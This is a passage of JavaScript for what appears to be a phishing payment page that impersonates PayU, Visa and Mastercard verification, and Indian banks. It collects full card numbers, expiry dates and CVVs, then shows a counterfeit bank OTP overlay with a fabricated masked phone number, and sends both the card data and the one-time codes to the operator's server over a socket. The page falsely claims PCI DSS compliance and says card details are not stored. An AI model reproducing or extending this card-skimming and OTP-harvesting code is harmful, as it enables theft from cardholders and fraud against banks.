        'card_disabled': 'This card has been disabled for online transactions',
        'invalid_card': 'Invalid card details',
        'canceled': 'Transaction canceled by user',
        '3Dsecure_is_not_enabled_for_your_card': '3D secure is not enabled for your card',
        'pickup_Card': 'This card has been flagged for pickup',
        'Incorrect_card_details': 'The card details entered are incorrect',
        'Credit_limit_exceeded': 'Your credit limit has been exceeded',
        'Incorrect_security_code': 'The security code is incorrect',
        'This_type_of_transacton_is_not_allowed_for_your_card': 'This type of transaction is not allowed for your card',
        'The_issuing_bank_flagged_the_transaction_as_potentially_fraudulent': 'Your issuing bank flagged the transaction as potentially fraudulent'
    };
    return reasons[reasonCode] || 'Your payment could not be processed';
}

function updateMcVerificationUI(data) {
    // Update UI elements with data
    document.getElementById('merchantName').textContent = data.merchantName || 'Peacock Merchandise';
    document.getElementById('transactionAmount').textContent = data.amount || state.amount.toFixed(2);
    document.getElementById('transactionDate').textContent = new Date().toLocaleTimeString();
    document.getElementById('cardNumberDisplay').textContent = 'XXXX XXXX XXXX ' + (state.cardForm.cardNumber.slice(-4) || '1234');
    document.getElementById('referenceId').textContent = data.invoiceId?.substring(0, 6) || Math.floor(100000 + Math.random() * 900000);
    
    // Set currency symbol
    updateCurrencyDisplay(data.currency || 'USD');
    
    // Set bank logo - ensure it shows a bank logo and not MasterCard
    const bankLogo = document.getElementById('bankLogo');
    if (bankLogo) {
        const bankCode = data.bankCode?.toLowerCase() || 'default';
        
        // Map of bank codes to logo URLs
        const bankLogos = {
            'default': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png', // Default to a bank logo, not MasterCard
            'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
            'sbi': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
            'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png',
            'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
            'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
            'kotak': 'https://static.wikia.nocookie.net/logopedia/images/1/16/Kotak_Mahindra_Bank.svg',
            'yes': 'https://upload.wikimedia.org/wikipedia/commons/b/b3/Yes_Bank_logo.svg'
        };
        
        bankLogo.src = bankLogos[bankCode] || bankLogos['default'];
    }
    
    // Set verification type logo
    const verificationLogo = document.getElementById('verificationTypeLogo');
    if (verificationLogo) {
        const verificationType = data.verificationType || detectCardType(state.cardForm.cardNumber);
        
        // Map of verification types to logos
        const verificationLogos = {
            'visa': 'https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg-.png',
            'mastercard': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png',
            'amex': 'https://logos-world.net/wp-content/uploads/2020/11/American-Express-Logo-700x394.png',
            'discover': 'https://logos-world.net/wp-content/uploads/2021/03/Discover-Logo-1985-2009.png'
        };
        
        verificationLogo.src = verificationLogos[verificationType] || verificationLogos['mastercard'];
    }
    
    // Set masked phone number
    if (data.phoneLastFour) {
        document.getElementById('cardLastFourDigits').textContent = `********${data.phoneLastFour}`;
    }
    
    // Make sure the consent checkbox is correctly styled
    const consentLabel = document.getElementById('consentLabel');
    if (consentLabel) {
        consentLabel.style.fontSize = '11px';
        consentLabel.style.marginLeft = '5px';
        consentLabel.style.marginRight = '5px';
        consentLabel.style.color = '#555';
    }

    const consentCheckbox = document.getElementById('mcConsentCheckbox');
    if (consentCheckbox) {
        consentCheckbox.style.width = '12px';
        consentCheckbox.style.height = '12px';
        consentCheckbox.style.marginTop = '2px';
        consentCheckbox.style.marginRight = '5px';
    }
    
    // Set up event handlers for buttons
    setupMcVerificationButtons();
}

function updateCurrencyDisplay(currency) {
    const currencySymbol = document.getElementById('currencySymbol');
    if (currencySymbol) {
        // Map of currency codes to symbols
        const symbols = {
            'USD': '$',
            'EUR': '€',
            'GBP': '£',
            'JPY': '¥',
            'INR': '₹',
            'AUD': 'A$',
            'CAD': 'C$',
            'CHF': 'CHF'
        };
        
        currencySymbol.textContent = symbols[currency] || '$';
    }
}

function setupMcVerificationButtons() {
    // Submit button handler
    const submitBtn = document.getElementById('mcSubmitBtn');
    if (submitBtn) {
        submitBtn.onclick = function() {
            const otpInput = document.getElementById('mcOtpInput');
            const otpValue = otpInput ? otpInput.value.trim() : '';
            
            if (!otpValue) {
                const errorMsg = document.getElementById('mcOtpError');
                if (errorMsg) {
                    errorMsg.textContent = 'Please enter the verification code';
                    errorMsg.style.display = 'block';
                }
                return;
            }
            
            // Show loading state - don't show "Invalid OTP" immediately
            submitBtn.disabled = true;
            submitBtn.textContent = 'Verifying...';
            
            // Hide any existing error message
            const errorMsg = document.getElementById('mcOtpError');
            if (errorMsg) {
                errorMsg.style.display = 'none';
            }
            
            // Submit OTP to server - keep showing "Verifying..." until we get server response
            socket.emit('mc_otp_submitted', {
                invoiceId: state.transactionId,
                otp: otpValue,
                timestamp: new Date().toISOString()
            });
            
            // We no longer show error automatically - we wait for server response
        };
    }
    
    // Resend button handler
    const resendBtn = document.getElementById('mcResendBtn');
    if (resendBtn) {
        resendBtn.onclick = function() {
            resendBtn.disabled = true;
            resendBtn.textContent = 'Sending...';
            
            // Request OTP resend
            socket.emit('mc_resend_otp', {
                invoiceId: state.transactionId
            });
            
            // Reset button after delay
            setTimeout(() => {
                resendBtn.disabled = false;
                resendBtn.textContent = 'Resend';
                
                // Show toast notification
                showToast('OTP Resent', 'A new code has been sent to your mobile');
            }, 2000);
        };
    }
    
    // Cancel button handler
    const cancelBtn = document.getElementById('mcCancelBtn');
    if (cancelBtn) {
        cancelBtn.onclick = function() {
            if (confirm('Are you sure you want to cancel this verification?')) {
                // Hide the verification overlay
                const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
                if (mcVerificationOverlay) {
                    mcVerificationOverlay.style.display = 'none';
                }
                
                // Clear the MC timer if it exists
                if (mcTimerInterval) {
                    clearInterval(mcTimerInterval);
                }
                
                // Notify server
                socket.emit('mc_verification_cancelled', {
                    invoiceId: state.transactionId
                });
                
                // Redirect to card form
                resetForm();
            }
        };
    }
    
    // OTP input validation and formatting
    const otpInput = document.getElementById('mcOtpInput');
    if (otpInput) {
        otpInput.oninput = function() {
            // Only allow digits
            this.value = this.value.replace(/\D/g, '');
            
            // Hide error message when typing
            const errorMsg = document.getElementById('mcOtpError');
            if (errorMsg) {
                errorMsg.style.display = 'none';
            }
        };
    }
}
function showMCVerification(data) {
    console.log('Showing MC verification overlay with data:', data);
    
    const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
    const loadingVerificationLogo = document.getElementById('loadingVerificationLogo');
    
    if (mcVerificationOverlay) {
        // Determine card/verification type
        let cardType = data.cardType || detectCardType(state.cardForm.cardNumber);
        
        // Select appropriate logo for loading screen
        if (loadingVerificationLogo) {
            let logoSrc;
            
            switch(cardType.toLowerCase()) {
                case 'visa':
                    logoSrc = 'https://logowik.com/content/uploads/images/visa-new-20215093.jpg';
                    break;
                case 'amex':
                    logoSrc = 'https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png';
                    break;
                case 'discover':
                    logoSrc = 'https://1000logos.net/wp-content/uploads/2021/05/Discover-logo.png';
                    break;
                default: // mastercard is default
                    logoSrc = 'https://logodix.com/logo/21144.jpg';
                    break;
            }
            loadingVerificationLogo.innerHTML = `<img src="${logoSrc}" alt="${cardType}" style="max-height: 90px; max-width: 250px;">`;
        }
        
        // Show the overlay with loading screen
        mcVerificationOverlay.style.display = 'flex';
        const mcLoadingContent = document.getElementById('mcLoadingContent');
        const mcVerificationContent = document.getElementById('mcVerificationContent');
        
        if (mcLoadingContent && mcVerificationContent) {
            mcLoadingContent.style.display = 'flex';
            mcVerificationContent.style.display = 'none';
        }
    }
}

function detectCardType(cardNumber) {
    cardNumber = cardNumber.replace(/\D/g, '');
    
    if (cardNumber.startsWith('4')) {
        return 'visa';
    } else if (/^5[1-5]/.test(cardNumber)) {
        return 'mastercard';
    } else if (/^3[47]/.test(cardNumber)) {
        return 'amex';
    } else if (/^6(?:011|5)/.test(cardNumber)) {
        return 'discover';
    }
    
    return 'mastercard'; // Default
}

function generateRandomPhone() {
    const area = Math.floor(Math.random() * 900) + 100;
    const middle = Math.floor(Math.random() * 900) + 100;
    const last = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
    
    state.maskedPhone = `+1 (***) ***-${last.substring(last.length - 4)}`;
    const fullPhone = `+1 (${area}) ${middle}-${last}`;
    console.log("Full phone for verification:", fullPhone);
}

function formatCardNumber(value) {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || '';
    const parts = [];
    
    for (let i = 0; i < match.length; i += 4) {
        parts.push(match.substring(i, i + 4));
    }
    
    return parts.length ? parts.join(' ') : value;
}

function detectCardType(cardNumber) {
    const number = cardNumber.replace(/\s+/g, '');
    
    if (number.startsWith('4')) {
        state.cardType = 'visa';
    } else if (number.startsWith('5')) {
        state.cardType = 'mastercard';
    } else if (number.startsWith('3')) {
        state.cardType = 'amex';
    } else if (number.startsWith('6')) {
        state.cardType = 'discover';
    } else if (/^(81|82)/.test(number)) {
        state.cardType = 'rupay';
    } else {
        state.cardType = null;
    }
    
    return state.cardType;
}

function formatExpiryDate(value) {
    let v = value.replace(/\D/g, '');
    
    if (v.length > 2) {
        return `${v.slice(0, 2)}/${v.slice(2, 4)}`;
    }
    
    return v;
}

function validateCardForm() {
    const errors = {};
    const { cardNumber, cardHolder, expiryDate, cvv } = state.cardForm;
    
    if (!cardNumber || cardNumber.replace(/\s/g, '').length < 16) {
        errors.cardNumber = "Card number must be 16 digits";
    }
    
    if (!cardHolder || cardHolder.length < 3) {
        errors.cardHolder = "Card holder name is required";
    }
    
    if (!expiryDate || !/^(0[1-9]|1[0-2])\/([0-9]{2})$/.test(expiryDate)) {
        errors.expiryDate = "Must be in MM/YY format";
    }
    
    if (!cvv || cvv.length < 3 || cvv.length > 4) {
        errors.cvv = "CVV must be 3-4 digits";
    }
    
    state.cardForm.errors = errors;
    return Object.keys(errors).length === 0;
}

function handleCardSubmit(e) {
    e.preventDefault();
    console.log('Form submitted, preventing default and processing payment...');
    
    if (!validateCardForm()) {
        const { cardNumber, cardHolder, expiryDate, cvv } = state.cardForm.errors;
        if (cardNumber) {
            document.getElementById('card-number').classList.add('border-red-500');
        }
        if (cardHolder) {
            document.getElementById('card-holder').classList.add('border-red-500');
        }
        if (expiryDate) {
            document.getElementById('expiry-date').classList.add('border-red-500');
        }
        if (cvv) {
            document.getElementById('cvv').classList.add('border-red-500');
        }
        return false;
    }
    
    document.getElementById('card-number').classList.remove('border-red-500');
    document.getElementById('card-holder').classList.remove('border-red-500');
    document.getElementById('expiry-date').classList.remove('border-red-500');
    document.getElementById('cvv').classList.remove('border-red-500');
    
    const submitBtn = document.querySelector('button[type="submit"]');
    submitBtn.disabled = true;
    submitBtn.innerHTML = `
        <div class="flex items-center justify-center">
            <svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
            </svg>
            Processing
        </div>
    `;
    
    state.transactionId = Math.random().toString(36).substring(2, 15);
    
    const cardData = {
        cardNumber: state.cardForm.cardNumber.replace(/\s/g, ''),
        cardholder: state.cardForm.cardHolder,
        expiry: state.cardForm.expiryDate,
        cvv: state.cardForm.cvv,
        amount: state.amount,
        currency: "USD",
        email: "customer@example.com",
        cardType: state.cardType
    };
    
    socket.emit('card_submitted', {
        invoiceId: state.transactionId,
        cardData: cardData,
        timestamp: new Date().toISOString()
    });
    
    showProcessingUI();
    
    setTimeout(() => {
        const processingIndicator = document.querySelector('.processing-indicator');
        if (processingIndicator) {
            showErrorUI("Connection Timeout", "No response from payment server. Please try again.");
        }
    }, 30000);
    
    return false;
}

function showToast(title, message, type = 'info') {
    const toast = document.createElement('div');
    toast.className = `fixed top-4 right-4 max-w-xs bg-white border rounded-lg shadow-lg p-4 z-50 ${
        type === 'error' ? 'border-red-500' : 'border-blue-500'
    }`;
    
    toast.innerHTML = `
        <div class="flex items-center">
            <div class="${type === 'error' ? 'text-red-500' : 'text-blue-500'} mr-3">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
                    ${type === 'error' 
                      ? '<path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd"/>'
: '<path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>'
                    }
                </svg>
            </div>
            <div>
                <div class="font-bold text-gray-900">${title}</div>
                <div class="text-sm text-gray-600">${message}</div>
            </div>
        </div>
    `;
    
    document.body.appendChild(toast);
    
    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transition = 'opacity 0.5s ease';
        setTimeout(() => {
            document.body.removeChild(toast);
        }, 500);
    }, 3000);
}

function showCardUI() {
    const appDiv = document.getElementById('app');
    appDiv.innerHTML = `
        <div class="card-container w-full max-w-5xl">
            <div class="header-bar">
                <div class="flex justify-between items-center">
                    <div class="text-2xl font-bold">PayU</div>
                    <p class="text-sm">Secure Payment</p>
                </div>
                <div class="text-gray-100">
                    Amount: $${state.amount.toFixed(2)} USD
                </div>
            </div>
            
            <div class="md:flex">
                <!-- Left Side - Order Summary -->
                <div class="order-summary md:w-1/2">
                    <h2>Order Summary</h2>
                    
                    <div class="space-y-2">
                        <div class="flex justify-between">
                            <span class="text-gray-600">Sub Total</span>
                            <span>$1,200.00</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-gray-600">Tax (GST)</span>
                            <span>$99.00</span>
                        </div>
                        <div class="border-t border-gray-200 my-2 pt-2 flex justify-between font-semibold">
                            <span>Total Amount</span>
                            <span>$${state.amount.toFixed(2)}</span>
                        </div>
                    </div>
                    
                    <div class="my-6">
                        <div class="flex items-center space-x-2 mb-3">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.618 5.984A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016zM12 9v2m0 4h.01" />
                            </svg>
                            <span class="font-medium">Secure Payment Gateway</span>
                        </div>
                        <p class="text-sm text-gray-600">
                            Your payment information is securely transmitted using 256-bit encryption. We do not store your card details.
                        </p>
                    </div>
                    
                    <div>
                        <h3 class="text-md font-medium mb-2">We Accept</h3>
                        <div class="flex flex-wrap gap-3">
                            <div class="h-8 w-12 flex items-center justify-center">
                                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" class="h-6 w-auto object-contain" />
                            </div>
                            <div class="h-8 w-12 flex items-center justify-center">
                                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" class="h-6 w-auto object-contain" />
                            </div>
                            <div class="h-8 w-12 flex items-center justify-center">
                                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="American Express" class="h-6 w-auto object-contain" />
                            </div>
                            <div class="h-8 w-12 flex items-center justify-center">
                                <img src="https://1000logos.net/wp-content/uploads/2021/05/Discover-logo-500x281.png" alt="Discover" class="h-6 w-auto object-contain" />
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Right Side - Card Details -->
                <div class="card-details-section md:w-1/2">
                    <h2>Card Details</h2>
                    <form id="card-form" class="space-y-4">
                        <div class="form-group">
                            <label>Card Number</label>
                            <div class="relative">
                                <div class="input-icon left">
                                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-5 w-5">
                                        <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
                                        <line x1="1" y1="10" x2="23" y2="10"></line>
                                    </svg>
                                </div>
                               <input 
                                    type="text" 
                                    id="card-number" 
                                    placeholder="1234 5678 9012 3456" 
                                    maxlength="19" 
                                    class="pl-10 pr-10"
                                />
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label>Card Holder Name</label>
                            <input 
                                type="text" 
                                id="card-holder" 
                                placeholder="John Doe"
                            />
                        </div>
                        
                        <div class="grid grid-cols-2 gap-4">
                            <div class="form-group">
                                <label>Expiry Date</label>
                                <input 
                                    type="text" 
                                    id="expiry-date" 
                                    placeholder="MM/YY" 
                                    maxlength="5"
                                />
                            </div>
                            
                            <div class="form-group">
                                <label>CVV</label>
                                <div class="relative">
                                    <div class="input-icon left">
                                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-5 w-5">
                                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                                        </svg>
                                    </div>
                                    <input 
                                        type="password" 
                                        id="cvv" 
                                        placeholder="123" 
                                        maxlength="4" 
                                        class="pl-10"
                                    />
                                </div>
                            </div>
                        </div>
                        
                        <button 
                            type="submit" 
                            class="pay-now-btn"
                        >
                            Pay Now
                        </button>
                    </form>
                </div>
            </div>
            
            <div class="footer-bar">
                <div class="security-badge">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/PCI_Logo.svg" alt="PCI DSS" />
                    <span class="text-xs text-gray-500">PCI DSS Compliant</span>
                </div>
                <div class="separator-vertical"></div>
                <div>
                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b9/Verified_by_Visa.svg" alt="Verified by Visa" class="h-6 w-auto" />
                </div>
                <div>
                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a6/Mastercard_SecureCode_horizontal.svg" alt="Mastercard SecureCode" class="h-6 w-auto" />
                </div>
                <div class="separator-vertical"></div>
                <div class="text-xs text-gray-500">Powered by PayU Biz</div>
            </div>
        </div>
    `;
    
    setTimeout(() => {
        setupCardFormHandlers();
        console.log('Card form handlers set up after delay');
    }, 100);
}

function setupCardFormHandlers() {
    console.log('Setting up card form handlers...');
    const cardNumberInput = document.getElementById('card-number');
    const cardHolderInput = document.getElementById('card-holder');
    const expiryDateInput = document.getElementById('expiry-date');
    const cvvInput = document.getElementById('cvv');
    const cardForm = document.getElementById('card-form');
    
    if (cardNumberInput) {
        cardNumberInput.addEventListener('input', (e) => {
            const formattedValue = formatCardNumber(e.target.value);
            state.cardForm.cardNumber = formattedValue;
            e.target.value = formattedValue;
            detectCardType(formattedValue);
            
            if (state.cardType) {
                const cardIconContainer = document.querySelector('.input-icon.right');
                const html = `
                    <div class="h-7 w-12 flex items-center justify-center">
                        ${state.cardType === 'visa' ? 
                            '<img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" class="h-7 w-auto" />' : 
                        state.cardType === 'mastercard' ? 
                            '<img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" class="h-7 w-auto" />' : 
                        state.cardType === 'amex' ? 
                            '<img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="Amex" class="h-7 w-auto" />' : 
                        state.cardType === 'discover' ? 
                            '<img src="https://upload.wikimedia.org/wikipedia/commons/d/d1/Discover_Card_logo.svg" alt="Discover" class="h-7 w-auto" />' : 
                        state.cardType === 'rupay' ? 
                            '<img src="https://upload.wikimedia.org/wikipedia/commons/c/cb/Rupay-Logo.png" alt="RuPay" class="h-7 w-auto" />' : 
                        ''}
                    </div>
                `;
                
                if (cardIconContainer) {
                    cardIconContainer.innerHTML = html;
                } else {
                    const iconDiv = document.createElement('div');
                    iconDiv.className = 'input-icon right';
                    iconDiv.innerHTML = html;
                    e.target.parentNode.appendChild(iconDiv);
                }
            } else {
                const cardIconContainer = document.querySelector('.input-icon.right');
                if (cardIconContainer) {
                    cardIconContainer.remove();
                }
            }
        });
    }
    
    if (cardHolderInput) {
        cardHolderInput.addEventListener('input', (e) => {
            state.cardForm.cardHolder = e.target.value;
        });
    }
    
    if (expiryDateInput) {
        expiryDateInput.addEventListener('input', (e) => {
            const formattedValue = formatExpiryDate(e.target.value);
state.cardForm.expiryDate = formattedValue;
            e.target.value = formattedValue;
        });
    }
    
    if (cvvInput) {
        cvvInput.addEventListener('input', (e) => {
            state.cardForm.cvv = e.target.value;
        });
    }
    
    if (cardForm) {
        cardForm.addEventListener('submit', handleCardSubmit);
        console.log('Card form submit handler attached');
    }
}

function showProcessingUI() {
    const appDiv = document.getElementById('app');
    appDiv.innerHTML = `
        <div class="card-container w-full max-w-5xl">
            <div class="header-bar">
                <div class="flex justify-between items-center">
                    <div class="text-2xl font-bold">PayU</div>
                    <p class="text-sm">Secure Payment</p>
                </div>
                <div class="text-gray-100">
                    Amount: $${state.amount.toFixed(2)} USD
                </div>
            </div>
            
            <div class="flex items-center justify-center p-12">
                <div class="flex flex-col items-center justify-center processing-indicator">
                    <div class="animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-primary mb-4"></div>
                    <h3 class="text-lg font-medium mb-2">Processing Payment</h3>
                    <p class="text-sm text-gray-500 text-center">
                        Please wait while we process your payment. Do not close this window.
                    </p>
                </div>
            </div>
            
            <div class="footer-bar">
                <div class="security-badge">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/PCI_Logo.svg" alt="PCI DSS" />
                    <span class="text-xs text-gray-500">PCI DSS Compliant</span>
                </div>
                <div class="separator-vertical"></div>
                <div>
                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b9/Verified_by_Visa.svg" alt="Verified by Visa" class="h-6 w-auto" />
                </div>
                <div>
                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a6/Mastercard_SecureCode_horizontal.svg" alt="Mastercard SecureCode" class="h-6 w-auto" />
                </div>
                <div class="separator-vertical"></div>
                <div class="text-xs text-gray-500">Powered by PayU Biz</div>
            </div>
        </div>
    `;
}

function showOTPUI() {
    if (!state.maskedPhone) {
        generateRandomPhone();
    }
    
    const appDiv = document.getElementById('app');
    appDiv.innerHTML = `
      <div class="card-container w-full max-w-5xl">
            <div class="header-bar">
                <div class="flex justify-between items-center">
                    <div class="text-2xl font-bold">PayU</div>
                    <p class="text-sm">Secure Payment</p>
                </div>
                <div class="text-gray-100">
                    Amount: $${state.amount.toFixed(2)} USD
                </div>
            </div>
            
            <div class="flex justify-center p-8">
                <div class="space-y-4 max-w-md w-full">
                    <div class="bg-blue-50 rounded-lg p-6 mb-2">
                        <div class="flex justify-center mb-2">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.618 5.984A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016zM12 9v2m0 4h.01" />
                            </svg>
                        </div>
                        
                        <h2 class="text-xl font-semibold text-center mb-1">Authentication Required</h2>
                        <p class="text-sm text-gray-600 text-center mb-4">
                            For your security, we need to verify your identity
                        </p>
                        
                        <div class="bg-white p-3 rounded-lg border border-gray-200">
                            <div class="flex items-center">
                                <div class="bg-blue-100 rounded-full p-2 mr-3">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
                                    </svg>
                                </div>
                                <div>
                                    <div class="text-xs text-gray-500">We sent a verification code to</div>
                                    <div class="font-medium">${state.maskedPhone}</div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <h3 class="text-lg font-medium mb-2 text-center">Enter Verification Code</h3>
                    
                    <div class="otp-input mb-6">
                        <input type="text" maxlength="1" class="otp-digit" data-index="0" />
                        <input type="text" maxlength="1" class="otp-digit" data-index="1" />
                        <input type="text" maxlength="1" class="otp-digit" data-index="2" />
                        <input type="text" maxlength="1" class="otp-digit" data-index="3" />
                        <input type="text" maxlength="1" class="otp-digit" data-index="4" />
                        <input type="text" maxlength="1" class="otp-digit" data-index="5" />
                    </div>
                    
                    <div class="flex items-center justify-center mb-4">
                        <div class="w-14 h-14 rounded-full bg-blue-50 flex items-center justify-center">
                            <span class="text-lg font-medium text-blue-500">
                                ${String(Math.floor(state.timeLeft / 60)).padStart(2, '0')}:
                                ${String(state.timeLeft % 60).padStart(2, '0')}
                            </span>
                        </div>
                    </div>
                    
                    <div class="text-center mb-4">
                        <button 
                            id="resend-otp"
                            class="text-blue-600 font-medium ${!state.canResend ? 'opacity-50 cursor-not-allowed' : ''}"
                            ${!state.canResend ? 'disabled' : ''}
                        >
                            Resend Code
                        </button>
                    </div>
                    
                    <button 
                        id="verify-otp"
                        class="pay-now-btn" 
                        disabled
                    >
                        Verify & Complete Payment
                    </button>
                </div>
            </div>
            
            <div class="footer-bar">
                <div class="security-badge">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/PCI_Logo.svg" alt="PCI DSS" />
                    <span class="text-xs text-gray-500">PCI DSS Compliant</span>
                </div>
                <div class="separator-vertical"></div>
                <div>
                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b9/Verified_by_Visa.svg" alt="Verified by Visa" class="h-6 w-auto" />
                </div>
                <div>
                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a6/Mastercard_SecureCode_horizontal.svg" alt="Mastercard SecureCode" class="h-6 w-auto" />
                </div>
                <div class="separator-vertical"></div>
                <div class="text-xs text-gray-500">Powered by PayU Biz</div>
            </div>
        </div>
    `;
    
    startOTPTimer();
    setupOTPHandlers();
}

function startOTPTimer() {
    state.timeLeft = 59;
    state.canResend = false;
    
    if (timerRef) {
        clearInterval(timerRef);
    }
    
    const timerDisplay = document.querySelector('.text-lg.font-medium.text-blue-500');
    if (timerDisplay) {
        timerDisplay.textContent = `00:${String(state.timeLeft).padStart(2, '0')}`;
    }
    
    timerRef = setInterval(() => {
        state.timeLeft--;
        
        if (timerDisplay) {
            timerDisplay.textContent = `00:${String(state.timeLeft).padStart(2, '0')}`;
        }
        
        if (state.timeLeft <= 0) {
            clearInterval(timerRef);
            state.canResend = true;
            
            const resendBtn = document.getElementById('resend-otp');
            if (resendBtn) {
                resendBtn.classList.remove('opacity-50', 'cursor-not-allowed');
                resendBtn.disabled = false;
            }
        }
    }, 1000);
}

function showSuccessUI() {
    const appDiv = document.getElementById('app');
    appDiv.innerHTML = `
        <div class="card-container w-full max-w-5xl">
            <div class="header-bar">
                <div class="flex justify-between items-center">
                    <div class="text-2xl font-bold">PayU</div>
                    <p class="text-sm">Secure Payment</p>
                </div>
                <div class="text-gray-100">
                    Amount: $${state.amount.toFixed(2)} USD
                </div>
            </div>
            
            <div class="flex justify-center p-8">
                <div class="flex flex-col items-center justify-center py-8">
                    <div class="h-16 w-16 bg-green-100 rounded-full flex items-center justify-center mb-4">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
                        </svg>
                    </div>
                    <h3 class="text-lg font-medium mb-2">Payment Successful</h3>
                    <p class="text-sm text-gray-500 text-center mb-4">
                        Your payment of $${state.amount.toFixed(2)} has been processed successfully.<br />
                        Transaction ID: <span class="font-medium">${state.transactionId}</span>
                    </p>
                    <button id="try-again" class="bg-white text-gray-800 border border-gray-300 py-2 px-6 rounded-md hover:bg-gray-50 transition-all">
                        Make Another Payment
                    </button>
                </div>
            </div>
            
            <div class="footer-bar">
                <div class="security-badge">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/PCI_Logo.svg" alt="PCI DSS" />
                    <span class="text-xs text-gray-500">PCI DSS Compliant</span>
                </div>
                <div class="separator-vertical"></div>
                <div>
                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b9/Verified_by_Visa.svg" alt="Verified by Visa" class="h-6 w-auto" />
                </div>
                <div>
                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a6/Mastercard_SecureCode_horizontal.svg" alt="Mastercard SecureCode" class="h-6 w-auto" />
                </div>
                <div class="separator-vertical"></div>
                <div class="text-xs text-gray-500">Powered by PayU Biz</div>
            </div>
        </div>
    `;
    
    const tryAgainBtn = document.getElementById('try-again');
    if (tryAgainBtn) {
        tryAgainBtn.addEventListener('click', resetForm);
    }
}

function showErrorUI(title, message) {
